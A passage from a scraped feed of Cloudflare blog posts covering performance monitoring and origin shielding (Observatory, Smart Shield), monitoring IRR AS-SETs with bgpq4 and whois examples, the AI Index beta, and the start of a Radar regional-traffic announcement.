all the way back to the origin server. Based on our data, again, that’s exactly what we see.If we consider our Time To First Byte thresholds again (good is <= 800ms; needs improvement is > 800ms and less than 1800ms; poor is anything over 1800ms), when looking across 9 billion data points as collected by our RUM solution, we see that a whopping 91.7% of all pages served from Cloudflare’s cache have a “good” TTFB compared to 79.7% when the request has to be served from the origin server.In other words, optimizing origin performance (more on that in a bit) and moving more content to the edge are sure-fire ways to give you a much stronger performance baseline. Accurate and detailed synthetic testing While real-user data is our source of truth, synthetic testing and monitoring is important as well. Because tests are run in a more controlled environment (test from this location, at this time, with this criteria, etc.), the resulting data is a lot less noisy and variable. In addition, because there is not a user involved and we don’t have to worry about any observer effect, synthetic tests are able to grab a lot more information about the request and page lifecycle.As a result, synthetic data tends to work very well for arming engineers with debugging information, as well as providing a cleaner set of data for comparing and contrasting results across different platforms, releases, and other situations.Observatory provides two different types of synthetic tests.The first synthetic test is a browser test. A browser test will load the requested page in a headless browser, run Google’s Lighthouse on it to report on key performance metrics, and provide some light suggestions for improvement. The second type of synthetic test Observatory provides is a network test. This is a brand new test type in Cloudflare, and is focused on giving you a better breakdown of the network and back-end performance of an endpoint.Each network test will hit the provided endpoint for the test and record the wait time, server response time, connect time, SSL negotiation time, and total load time for the endpoint response. Because these tests are much more targeted, a single test in itself is not as valuable and can be prone to variation. That variation isn’t necessarily a bad thing—in fact, variability in these results can actually give you a better understanding of the breadth of results when real users hit that same endpoint.For that reason, network tests trigger a series of individual runs against the provided endpoint spread out over a short period of time. The data for each response is recorded, and then presented as a histogram on the test results page, letting you see not just a single datapoint, but the long and short-tail of each metric. This gives you a much more accurate representation of reality than what a single test run can provide. You are also able to compare network tests in Observatory, by selecting two network tests that have been completed. Again, all the data points for each test will be provided in a histogram, where you can easily compare the results of the two. We are working on improving both synthetic test types in Q4 2025, focusing on making them more powerful and diagnostic.As we mentioned before, even at its best, synthetic data is an approximation of what is actually happening. Accuracy is critical. Inaccurate data can distract teams with variability and faulty measurements.It’s important that these tools are as accurate and true to the real world as possible. It’s also important to us that we give back to the community, both because it’s the right thing to do, and because we believe the best way to have the highest level of confidence in the measurement tools and frameworks we’re using is the rigor and scrutiny that open-source provides.For those reasons, we’ll be working on open-sourcing many of the testing agents we’re using to power Observatory. We’ll share more on that soon, as well as more details about how we’ve built each different testing tool, and why. Doing something about it: Smart Suggestions People don’t measure for the sake of having data and pretty charts. They measure because they want to be able to stay on top of the health of their application and find ways to improve it. Data is easy. Understanding what to do about the data you’re presented is both the hardest, and most important, part.Monitoring without action is useless.We’re building Observatory to have a relentless focus on actionability. Before any new metric is presented, we take some time to explore why that metric matters, when it’s something worth addressing, and what actions you should take if those metrics need improvement.All of that leads us to our new Smart Suggestions. Wherever possible, we want to pair each metric with a set of opinionated, data-driven suggestions for how to make things better. We want to avoid vague hand-wavy advice and instead be prescriptive and specific and precise.For example, let’s look at one particular recommendation we provide around improving Largest Contentful Paint.Largest Contentful Paint is a core web vital metric that measures when the largest piece of content is displayed on the screen. That piece of content could be an image, video or text.Much like TTFB, Largest Contentful Paint is a bit of a black box by itself. While it tells us how long it takes for that content to get on screen, there are a large number of potential bottlenecks that could be causing the delay. Perhaps the server response time was very slow. Or maybe there was something blocking the content from being displayed on the page. If the object was an image or video, perhaps the filesize was large and the resulting download was slow. LCP by itself doesn’t give us that level of granularity, so it’s hard to give more than hand wavy guidance on how to address it.Thankfully, just like we can break TTFB into subparts, we can break LCP into its subparts as well. Specifically we can look at:Time to First Byte: how quickly the server responds to the request for HTMLResource Load Delay: How long it takes after TTFB for the browser to discover the LCP resourceResource Load Duration: How long it takes for the browser to download the LCP resourceRender Delay: How long it takes the browser to render the content, after it has the resource in hand.Breaking it down into these subparts, we can be much more diagnostic about what to do. In the example above, our recommendation engine analyzes the site's real-user data and notices that Resource Load Delay accounts for over 10% of total LCP time. As a result, there’s a high likelihood that the resource triggering LCP is large and could potentially be compressed to reduce file size. So we make a recommendation to enable compression using Polish.We’re very excited about the impact these suggestions will have on helping everyone quickly zero in on meaningful solutions for improving performance and resiliency, without having to wade through mountains of data to get there. As we analyze data, we’ll find more and more patterns of problems and the solutions they can map to. Expanding on our Smart Suggestions will be a constant and ongoing focus as we move forward, and we are working on adding much more content about those patterns and what we find in Q4. Fixing the biggest pain point: Smart Shield Observatory gives you unprecedented insight into your application's health, but insights are only half the battle. The next challenge is acting on them, which brings us to another layer of complexity: protecting your origin. For many of our customers, proper management of origin routes and connections is one of the largest drivers of aggregate overall performance. As we mentioned before, we see a clear negative impact on user-facing performance metrics when we have to go back to the origin, and we want to make it as easy as possible for our customers to improve those experiences. Achieving this requires protecting against unnecessary load while ensuring only trusted traffic reaches your servers.Today's customers have powerful tools to protect their origins, but achieving basic use cases remains frustratingly complex:Making applications fasterReducing origin loadUnderstanding origin health issuesRestricting IP address access to origin serversThese fundamental needs currently require navigating multiple APIs and dashboard settings. You shouldn't need to become an expert in each feature — we should analyze your traffic patterns and provide clear, actionable solutions. Smart Shield: the future of origin shielding Smart Shield transforms origin protection from a complex, multi-tool challenge into a streamlined, intelligent solution that works on your behalf. Our unified API and UI combines all origin protection essentials — dynamic traffic acceleration, intelligent caching, health monitoring, and dedicated egress IPs — into one place that enables single-click configuration.But we didn't stop at simplification. Smart Shield integrates with Observatory to provide both the “what” — identifying performance bottlenecks and health issues — and the “how” — delivering capabilities that increase performance, availability, and security.This creates a continuous feedback loop: Observatory identifies problems, Smart Shield provides solutions, and real-time analytics verify the impact. But what does this mean for you? Reduce total cost of ownership (TCO)Reduce the time-to-value (TTV) for performance, availability, and security issues pertaining to customer originsEnable new features without guesswork and validate effectiveness in the dataYour time stays focused on building incredible user experiences, not becoming a configuration expert. We are excited to give you back time for your customers and your engineers, while paving the way for how you make sure your origin infrastructure is easily optimized to delight your customers. Protecting and accelerating origins with smart Connection Reuse Keeping your origins fast and stable is a big part of what we do at Cloudflare. When you experience a traffic surge, the last thing you want is for a flood of TLS handshakes to knock your origin down, or for those new connections to stall your requests, leaving your users to wait for slow pages to load.This is why we’ve made significant changes to how Cloudflare’s network talks to your origins to dramatically improve the performance of our origin connections. When Cloudflare makes a request to your origins, we make them from a subset of the available machines in every Cloudflare data center so that we can improve your connection reuse. Until now, this pool would be sized the same by default for every application within a data center, and changes to the sizing of the pool for a particular customer would need to be made manually. This often led to suboptimal connection reuse for our customers, as we might be making requests from way more machines than were actually needed, resulting in fewer warm connection pools than we otherwise could have had. This also caused issues at our data centers from time to time, as larger applications might have more traffic than the default pool size was capable of serving, resulting in production incidents where engineers are paged and had to manually increase the fanout factor for specific customers.Now, these pool sizes are determined automatically and dynamically. By tracking domain-level traffic volume within a datacenter, we can automatically scale up and scale down the number of machines that serve traffic destined for customer origin servers for any particular customer, improving both the performance of customer websites and the reliability of our network. A massive, high-volume website with a considerable amount of API traffic will no longer be processed by the same number of machines as a smaller and more typical website. Our systems can respond to changes in customer traffic patterns within seconds, allowing us to quickly ramp up and respond to surges in origin traffic.Thanks to these improvements, Cloudflare now uses over 30% fewer connections across the board to talk to origins. To put this into a more understandable perspective, this translates to saving approximately 402 years of handshake time every day across our global traffic, or 12,060 years of handshake time saved per month! This means just by proxying your traffic through Cloudflare, you’ll see a 30% on average reduction in the amount of connections to your origin, keeping it more available while serving the same traffic volume and in turn lowering your egress fees. But, in many cases, the results observed can be far greater than 30%. For example, in one data center which is particularly heavy in API traffic, we saw a reduction in origin connections of ~60%! Many don’t realize that making more connections to an origin requires more compute and time for systems to create TCP and SSL handshakes. This takes time away from serving content requested by your end-users and can act as a hidden tax on your performance and overall to your application. We are proud to reduce the Internet's hidden tax by finding intelligent, innovative ways to reduce the amount of connections needed while supporting the same traffic volume.Watch out for more updates to Smart Shield at the start of 2026 — we’re working on adding self-serve support for dedicated CDN egress IP addresses, along with significant performance, reliability, and resilience improvements! Charting the course: next steps for Observatory & Smart Shield We’re really excited to share these two products with everyone today. Smart Shield and Observatory combine to provide a powerful one-two punch of insight and easy remediation.As we navigate the beta launch of Observatory, we know this is just the start.Our vision for Observatory is to be the single source of truth for your application’s health. We know that making the right decisions requires robust, accurate data, and we want to arm our customers with the most comprehensive picture available.In the coming months, we plan to continue driving forward with our goal of providing comprehensive data, backed by a clear path to action.Deeper, more diagnostic data. We’ll continue to break down data silos, bringing in more metrics to make sure you have a truly comprehensive view of your application’s health. We’ll be focused on going deeper and being more diagnostic, breaking down every aspect of both the request and page lifecycle to give you more granular data.More paths to solutions. People don’t measure for the sake of looking at data, they measure to solve problems. We’re going to continue to expand our suggestions, arming you with more precise, data-driven solutions to a wider range of issues, letting you fix problems with a single click through Smart Shield and bringing a tighter feedback loop to validate the impact of your configuration updates.Benchmarking against other products. Some of our customers split traffic between different CDNs due to regulatory or compliance requirements. Naturally, this brings up a whole series of questions about comparing the performance of the split traffic. In Observatory, you can compare these today, but we have a lot of things planned to make this even easier.Try out Observatory and Smart Shield yourself today. And if you have ideas or suggestions for making Observatory and Smart Shield better, we’re all ears and would love to talk! Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. SpeedPerformanceBirthday WeekAegis\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 2:00 PMCloudflare just got faster and more secure, powered by RustWe’ve replaced the original core system in Cloudflare with a new modular Rust-based proxy, replacing NGINX. ...By Richard Boulton, Steve Goldsmith, Maurizio Abba, Matthew BullockBirthday Week, Rust, NGINX, Deep Dive, Engineering\nSeptember 26, 2025 2:00 PMMonitoring AS-SETs and why they matterWe will cover some of the reasons why operators need to monitor the AS-SET memberships for their ASN, and now Cloudflare Radar can help. ...By Mingwei Zhang, Bryton HerdesBGP, RPKI, Birthday Week, Cloudflare Network, Radar\nSeptember 26, 2025 2:00 PMAn AI Index for all our customersCloudflare will soon automatically create an AI-optimized search index for your domain, and expose a set of ready-to-use standard APIs and tools including an MCP server, LLMs.txt, and a search API....By Celso Martinho, Anni WangAI, Birthday Week, Pay Per Crawl, AI Search, MCP", "timestamp": "2025-10-21T13:33:38.214098"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Monitoring AS-SETs and why they matter", "url": "https://blog.cloudflare.com/monitoring-as-sets-and-why-they-matter/", "published": "Fri, 26 Sep 2025 14:00:00 GMT", "content": "Monitoring AS-SETs and why they matter2025-09-26Mingwei ZhangBryton Herdes6 min read Introduction to AS-SETs An AS-SET, not to be confused with the recently deprecated BGP AS_SET, is an Internet Routing Registry (IRR) object that allows network operators to group related networks together. AS-SETs have been used historically for multiple purposes such as grouping together a list of downstream customers of a particular network provider. For example, Cloudflare uses the AS13335:AS-CLOUDFLARE AS-SET to group together our list of our own Autonomous System Numbers (ASNs) and our downstream Bring-Your-Own-IP (BYOIP) customer networks, so we can ultimately communicate to other networks whose prefixes they should accept from us. In other words, an AS-SET is currently the way on the Internet that allows someone to attest the networks for which they are the provider. This system of provider authorization is completely trust-based, meaning it's not reliable at all, and is best-effort. The future of an RPKI-based provider authorization system is coming in the form of ASPA (Autonomous System Provider Authorization), but it will take time for standardization and adoption. Until then, we are left with AS-SETs.Because AS-SETs are so critical for BGP routing on the Internet, network operators need to be able to monitor valid and invalid AS-SET memberships for their networks. Cloudflare Radar now introduces a transparent, public listing to help network operators in our routing page per ASN. AS-SETs and building BGP route filters AS-SETs are a critical component of BGP policies, and often paired with the expressive Routing Policy Specification Language (RPSL) that describes how a particular BGP ASN accepts and propagates routes to other networks. Most often, networks use AS-SET to express what other networks should accept from them, in terms of downstream customers. Back to the AS13335:AS-CLOUDFLARE example AS-SET, this is published clearly on PeeringDB for other peering networks to reference and build filters against. When turning up a new transit provider service, we also ask the provider networks to build their route filters using the same AS-SET. Because BGP prefixes are also created in IRR registries using the route or route6 objects, peers and providers now know what BGP prefixes they should accept from us and deny the rest. A popular tool for building prefix-lists based on AS-SETs and IRR databases is bgpq4, and it’s one you can easily try out yourself. For example, to generate a Juniper router’s IPv4 prefix-list containing prefixes that AS13335 could propagate for Cloudflare and its customers, you may use: % bgpq4 -4Jl CLOUDFLARE-PREFIXES -m24 AS13335:AS-CLOUDFLARE | head -n 10 policy-options { replace: prefix-list CLOUDFLARE-PREFIXES { 1.0.0.0/24; 1.0.4.0/22; 1.1.1.0/24; 1.1.2.0/24; 1.178.32.0/19; 1.178.32.0/20; 1.178.48.0/20; Restricted to 10 lines, actual output of prefix-list would be much greaterThis prefix list would be applied within an eBGP import policy by our providers and peers to make sure AS13335 is only able to propagate announcements for ourselves and our customers. How accurate AS-SETs prevent route leaks Let’s see how accurate AS-SETs can help prevent route leaks with a simple example. In this example, AS64502 has two providers – AS64501 and AS64503. AS64502 has accidentally messed up their BGP export policy configuration toward the AS64503 neighbor, and is exporting all routes, including those it receives from their AS64501 provider. This is a typical Type 1 Hairpin route leak. Fortunately, AS64503 has implemented an import policy that they generated using IRR data including AS-SETs and route objects. By doing so, they will only accept the prefixes that originate from the AS Cone of AS64502, since they are their customer. Instead of having a major reachability or latency impact for many prefixes on the Internet because of this route leak propagating, it is stopped in its tracks thanks to the responsible filtering by the AS64503 provider network. Again it is worth keeping in mind the success of this strategy is dependent upon data accuracy for the fictional AS64502:AS-CUSTOMERS AS-SET. Monitoring AS-SET misuse Besides using AS-SETs to group together one’s downstream customers, AS-SETs can also represent other types of relationships, such as peers, transits, or IXP participations.For example, there are 76 AS-SETs that directly include one of the Tier-1 networks, Telecom Italia / Sparkle (AS6762). Judging from the names of the AS-SETs, most of them are representing peers and transits of certain ASNs, which includes AS6762. You can view this output yourself at https://radar.cloudflare.com/routing/as6762#irr-as-sets There is nothing wrong with defining AS-SETs that contain one’s peers or upstreams as long as those AS-SETs are not submitted upstream for customer->provider BGP session filtering. In fact, an AS-SET for upstreams or peer-to-peer relationships can be useful for defining a network’s policies in RPSL.However, some AS-SETs in the AS6762 membership list such as AS-10099 look to attest customer relationships. % whois -h rr.ntt.net AS-10099 | grep \"descr\" descr: CUHK Customer We know AS6762 is transit free and this customer membership must be invalid, so it is a prime example of AS-SET misuse that would ideally be cleaned up. Many Internet Service Providers and network operators are more than happy to correct an invalid AS-SET entry when asked to. It is reasonable to look at each AS-SET membership like this as a potential risk of having higher route leak propagation to major networks and the Internet when they happen. AS-SET information on Cloudflare Radar Cloudflare Radar is a hub that showcases global Internet traffic, attack, and technology trends and insights. Today, we are adding IRR AS-SET information to Radar’s routing section, freely available to the public via both website and API access. To view all AS-SETs an AS is a member of, directly or indirectly via other AS-SETs, a user can visit the corresponding AS’s routing page. For example, the AS-SETs list for Cloudflare (AS13335) is available at https://radar.cloudflare.com/routing/as13335#irr-as-setsThe AS-SET data on IRR contains only limited information like the AS members and AS-SET members. Here at Radar, we also enhance the AS-SET table with additional useful information as follows.Inferred ASN shows the AS number that is inferred to be the creator of the AS-SET. We use PeeringDB AS-SET information match if available. Otherwise, we parse the AS-SET name to infer the creator.IRR Sources shows which IRR databases we see the corresponding AS-SET. We are currently using the following databases: AFRINIC, APNIC, ARIN, LACNIC, RIPE, RADB, ALTDB, NTTCOM, and TC.AS Members and AS-SET members show the count of the corresponding types of members.AS Cone is the count of the unique ASNs that are included by the AS-SET directly or indirectly.Upstreams is the count of unique AS-SETs that includes the corresponding AS-SET.Users can further filter the table by searching for a specific AS-SET name or ASN. A toggle to show only direct or indirect AS-SETs is also available. In addition to listing AS-SETs, we also provide a tree-view to display how an AS-SET includes a given ASN. For example, the following screenshot shows how as-delta indirectly includes AS6762 through 7 additional other AS-SETs. Users can copy or download this tree-view content in the text format, making it easy to share with others. We built this Radar feature using our publicly available API, the same way other Radar websites are built. We have also experimented using this API to build additional features like a full AS-SET tree visualization. We encourage developers to give this API (and other Radar APIs) a try, and tell us what you think! Looking ahead We know AS-SETs are hard to keep clean of error or misuse, and even though Radar is making them easier to monitor, the mistakes and misuse will continue. Because of this, we as a community need to push forth adoption of RFC9234 and implementations of it from the major vendors. RFC9234 embeds roles and an Only-To-Customer (OTC) attribute directly into the BGP protocol itself, helping to detect and prevent route leaks in-line. In addition to BGP misconfiguration protection with RFC9234, Autonomous System Provider Authorization (ASPA) is still making its way through the IETF and will eventually help offer an authoritative means of attesting who the actual providers are per BGP Autonomous System (AS).If you are a network operator and manage an AS-SET, you should seriously consider moving to hierarchical AS-SETs if you have not already. A hierarchical AS-SET looks like AS13335:AS-CLOUDFLARE instead of AS-CLOUDFLARE, but the difference is very important. Only a proper maintainer of the AS13335 ASN can create AS13335:AS-CLOUDFLARE, whereas anyone could create AS-CLOUDFLARE in an IRR database if they wanted to. In other words, using hierarchical AS-SETs helps guarantee ownership and prevent the malicious poisoning of routing information.While keeping track of AS-SET memberships seems like a chore, it can have significant payoffs in preventing BGP-related incidents such as route leaks. We encourage all network operators to do their part in making sure the AS-SETs you submit to your providers and peers to communicate your downstream customer cone are accurate. Every small adjustment or clean-up effort in AS-SETs could help lessen the impact of a BGP incident later.Visit Cloudflare Radar for additional insights around (Internet disruptions, routing issues, Internet traffic trends, attacks, Internet quality, etc.). Follow us on social media at @CloudflareRadar (X), https://noc.social/@cloudflareradar (Mastodon), and radar.cloudflare.com (Bluesky), or contact us via e-mail.Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. BGPRPKIBirthday WeekCloudflare NetworkRadar\nSeptember 30, 2025 10:05 AMNationwide Internet shutdown in Afghanistan extends localized disruptionsOn September 29, 2025, Internet connectivity was completely shut down across Afghanistan, impacting business, education, finance, and government services....By David BelsonRadar, Internet Shutdown, Internet Traffic, Outage\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 2:00 PMCloudflare just got faster and more secure, powered by RustWe’ve replaced the original core system in Cloudflare with a new modular Rust-based proxy, replacing NGINX. ...By Richard Boulton, Steve Goldsmith, Maurizio Abba, Matthew BullockBirthday Week, Rust, NGINX, Deep Dive, Engineering\nSeptember 26, 2025 2:00 PMAn AI Index for all our customersCloudflare will soon automatically create an AI-optimized search index for your domain, and expose a set of ready-to-use standard APIs and tools including an MCP server, LLMs.txt, and a search API....By Celso Martinho, Anni WangAI, Birthday Week, Pay Per Crawl, AI Search, MCP", "timestamp": "2025-10-21T13:33:38.981100"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "An AI Index for all our customers", "url": "https://blog.cloudflare.com/an-ai-index-for-all-our-customers/", "published": "Fri, 26 Sep 2025 14:00:00 GMT", "content": "An AI Index for all our customers2025-09-26Celso MartinhoAnni Wang6 min readToday, we’re announcing the private beta of AI Index for domains on Cloudflare, a new type of web index that gives content creators the tools to make their data discoverable by AI, and gives AI builders access to better data for fair compensation.With AI Index enabled on your domain, we will automatically create an AI-optimized search index for your website, and expose a set of ready-to-use standard APIs and tools including an MCP server, LLMs.txt, and a search API. Our customers will own and control that index and how it’s used, and you will have the ability to monetize access through Pay per crawl and the new x402 integrations. You will be able to use it to build modern search experiences on your own site, and more importantly, interact with external AI and Agentic providers to make your content more discoverable while being fairly compensated.For AI builders—whether developers creating agentic applications, or AI platform companies providing foundational LLM models—Cloudflare will offer a new way to discover and retrieve web content: direct pub/sub connections to individual websites with AI Index. Instead of indiscriminate crawling, builders will be able to subscribe to specific sites that have opted in for discovery, receive structured updates as soon as content changes, and pay fairly for each access. Access is always at the discretion of the site owner.From the individual indexes, Cloudflare will also build an aggregated layer, the Open Index, that bundles together participating sites. Builders get a single place to search across collections or the broader web, while every site still retains control and can earn from participation. Why build an AI Index? AI platforms are quickly becoming one of the main ways people discover information online. Whether asking a chatbot to summarize a news article or find a product recommendation, the path to that answer almost always starts with crawling original content and indexing or using that data for training. However, today, that process is largely controlled by platforms: what gets crawled, how often, and whether the site owner has any input in the matter.Although Cloudflare now offers to monitor and control how AI services respect your access policies and how they access your content, it's still challenging to make new content visible. Content creators have no efficient way to signal to AI builders when a page is published or updated. On the other hand, for AI builders, crawling and recrawling unstructured content is costly, wastes resources, especially when you don’t know the quality and cost in advance.We need a fairer and healthier ecosystem for content discovery and usage that bridges the gap between content creators and AI builders. How AI Index will work When you onboard a domain to Cloudflare, or if you have an existing domain on Cloudflare, you will have the choice to enable an AI Index. If enabled, we will automatically create an AI-optimized search index for your domain that you own and control. As your site updates and grows, the index will evolve with it. New or updated pages will be processed in real-time using the same technology that powers Cloudflare AI Search (formerly AutoRAG) and its Website as a data source. Best of all, we will manage everything; you won't have to worry about each individual component of compute, storage resources, databases, embeddings, chunking, or AI models. Everything will happen behind the scenes, automatically.Importantly, you will have control over what content to include or exclude from your website's index, and who can get access to your content via AI Crawl Control, ensuring that only the data you want to expose is made searchable and accessible. You also will be able to opt out of the AI Index completely; it will all be up to you.When your AI Index is set up, you will get a set of ready-to-use APIs: An MCP Server: Agentic applications will be able to connect directly to your site using the Model Context Protocol (MCP), making your content discoverable to agents in a standardized way. This includes support for NLWeb tools, an open project developed by Microsoft that defines a standard protocol for natural language queries on websites.A flexible search API: This endpoint will return relevant results in structured JSON. LLMs.txt and LLMs-full.txt: Standard files that provide LLMs with a machine-readable map of your site, following emerging open standards. These will help models understand how to use your site’s content at inference time. An example of llms.txt exists in the Cloudflare Developer Documentation.A bulk data API: An endpoint for transferring large amounts of content efficiently, available under the rules you set. Instead of querying for every document, AI providers will be able to ingest in one shot.Pub-sub subscriptions: AI platforms will be able to subscribe to your site’s index and receive events and content updates directly from Cloudflare in a structured format in real-time, making it easy for them to stay current without re-crawling.Discoverability directives: In robots.txt and well-known URIs to allow AI agents and crawlers visiting your site to discover and use the available API automatically. The index will integrate directly with AI Crawl Control, so you will be able to see who’s accessing your content, set rules, and manage permissions. And with Pay per crawl and x402 integrations, you can choose to directly monetize access to your content. A feed of the web for AI builders As an AI builder, you will be able to discover and subscribe to high-quality, permissioned web data through individual site’s AI indexes. Instead of sending crawlers blindly across the open Internet, you will connect via a pub/sub model: participating websites will expose structured updates whenever their content changes, and you will be able to subscribe to receive those updates in real-time. With this model, your new workflow may look something like this:Discover websites that have opted in: Browse and filter through a directory of websites that make their indexes available through Cloudflare.Evaluate content with metadata and metrics: Get content metadata information on various metrics (e.g., uniqueness, depth, contextual relevance, popularity) before accessing it.Pay fairly for access: When content is valuable, platforms can compensate creators directly through Pay per crawl. These payments not only enable access but also support the continued creation of original content, helping to sustain a healthier ecosystem for discovery.Subscribe to updates: Use pub-sub subscriptions to receive events about changes made by the website, so you know when to retrieve or crawl for new content without wasting resources on constant re-crawling. By shifting from blind crawling to a permissioned pub/sub system for the web, AI builders save time, cut costs, and gain access to cleaner, high-quality data while content creators remain in control and are fairly compensated. The aggregated Open Index Individual indexes provide AI platforms with the ability to access data directly from specific sites, allowing them to subscribe for updates, evaluate value, and pay for full content access on a per-site basis. But when builders need to work at a larger scale, managing dozens or hundreds of separate subscriptions can become complex. The Open Index will provide an additional option: a bundled, opt-in collection of those indexes, featuring sophisticated features such as quality, uniqueness, originality, and depth of content filters, all accessible in one place. The Open Index is designed to make content discovery at scale easier:Get unified access: Query and retrieve data across many participating sites simultaneously. This reduces integration overhead and enables builders to plug into a curated collection of data, or use it as a ready-made web search layer that can be accessed at query time.Discover broader scopes: Work with topic-specific bundles (e.g., news, documentation, scientific research) or a general discovery index covering the broader web. This makes it simple to explore new content sources you may not have identified individually.Bottom-up monetization: Results still originate from an individual site’s AI index, with monetization flowing back to that site through Pay per crawl, helping preserve fairness and sustainability at scale.Together, per-site AI indexes and the Open Index will provide flexibility and precise control when you want full content from individual sites (i.e., for training, AI agents, or search experiences), and broad search coverage when you need a unified search across the web. How you can participate in the shift With AI Index and the Cloudflare Open Index, we’re creating a model where websites decide how their content is accessed, and AI builders receive structured, reliable data at scale to build a fairer and healthier ecosystem for content discovery and usage on the Internet.We’re starting with a private beta. If you want to enroll your website into the AI Index or access the pub/sub web feed as an AI builder, you can sign up today.Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. AIBirthday WeekPay Per CrawlAI SearchMCP\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 2:00 PMCloudflare just got faster and more secure, powered by RustWe’ve replaced the original core system in Cloudflare with a new modular Rust-based proxy, replacing NGINX. ...By Richard Boulton, Steve Goldsmith, Maurizio Abba, Matthew BullockBirthday Week, Rust, NGINX, Deep Dive, Engineering\nSeptember 26, 2025 2:00 PMMonitoring AS-SETs and why they matterWe will cover some of the reasons why operators need to monitor the AS-SET memberships for their ASN, and now Cloudflare Radar can help. ...By Mingwei Zhang, Bryton HerdesBGP, RPKI, Birthday Week, Cloudflare Network, Radar\nSeptember 26, 2025 2:00 PMIntroducing Observatory and Smart Shield — see how the world sees your website, and make it faster in one clickWe're announcing two enhancements to our Application Performance suite that'll show how the world sees your website, and make it faster with one click - available Cloudflare Dashboard!...By Tim Kadlec, Brian Batraski, Noah Maxwell KennedySpeed, Performance, Birthday Week, Aegis", "timestamp": "2025-10-21T13:33:39.749541"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Introducing new regional Internet traffic and Certificate Transparency insights on Cloudflare Radar", "url": "https://blog.cloudflare.com/new-regional-internet-traffic-and-certificate-transparency-insights-on-radar/", "published": "Fri, 26 Sep 2025 13:00:00 GMT", "content": "Introducing new regional Internet traffic and Certificate Transparency insights on Cloudflare Radar2025-09-26David BelsonAndré JesusLuke Valenta15 min readSince launching during Birthday Week in 2020, Radar has announced significant new capabilities and data sets during subsequent Birthday Weeks. We continue that tradition this year with a two-part launch, adding more dimensions to Radar’s ability to slice and dice the Internet.First, we’re adding regional traffic insights. Regional traffic insights bring a more localized perspective to the traffic trends shown on Radar.Second, we’re adding detailed Certificate Transparency (CT) data, too. The new CT data builds on the work that Cloudflare has been doing around CT since 2018, including Merkle Town, our initial CT dashboard.Both features extend Radar's mission of providing deeper, more granular visibility into the health and security of the Internet. Below, we dig into these new capabilities and data sets. Introducing regional Internet traffic insights on Radar Cloudflare Radar initially launched with visibility into Internet traffic trends at a national level: want to see how that Internet shutdown impacted traffic in Iraq, or what IPv6 adoption looks like in India? It’s visible on Radar. Just a year and a half later, in March 2022, we launched Autonomous System (ASN) pages on Radar. This has enabled us to bring more granular visibility to many of our metrics: What’s network performance like on AS701 (Verizon Fios)? How thoroughly has AS812 (Rogers Communications) implemented routing security? Did AS58322 (Halasat) just go offline? It’s all visible on Radar.However, sometimes Internet usage shifts on a more local level — maybe a sporting event in a particular region drives people online to find out more information. Or maybe a storm or other natural disaster causes infrastructure damage and power outages in a given state, impacting Internet traffic.For the last few years, the Radar team relied on internal data sets and Jupyter notebooks to visualize these “sub-national” traffic shifts. But today, we are bringing that insight to Cloudflare Radar, and to you, with the launch of regional traffic insights. With this new capability, you’ll be able to see traffic trends at a more local level, including bytes and requests, as well as breakouts of desktop/mobile device and bot/human traffic shares. And for even more granular visibility, within the Data Explorer, you’ll also be able to select an autonomous system to join with the regional selection — for example, looking at AS7922 (Comcast) in Massachusetts (United States). Geographic guidance In line with common industry practice, the region names displayed on Radar are sourced in data from GeoNames (geonames.org), a crowdsourced geographical database. Specifically, we are using the “first-order administrative divisions” listed for each country — for example, the states of America, the departments of Honduras, or the provinces of Canada. Those geographical names reflect data provided by GeoNames; for more information, please refer to their About page.Requests logged by Cloudflare’s services include the IP address of the device making the request. The address range (“prefix”) that includes this address is associated with a GeoNames ID within our IP address geolocation data, and we then match that GeoNames ID with the associated country and “first order administrative division” found in the GeoNames dataset. (For example: 155.246.1.142 → 155.246.0.0/16 → GeoNames ID 5101760 → United States > New Jersey) Drilling down into Radar traffic data Within Cloudflare Radar, there are several ways to get to this regional data. If you know the name of the region of interest, you can type it into the search bar at the top of the page, and select it from the results. For example, beginning to type Massachusetts returns the U.S. state, linked to its regional traffic page. Typing the region name into the Traffic in dropdown at the top of a Traffic page will also return the same set of results. Radar’s country-level pages 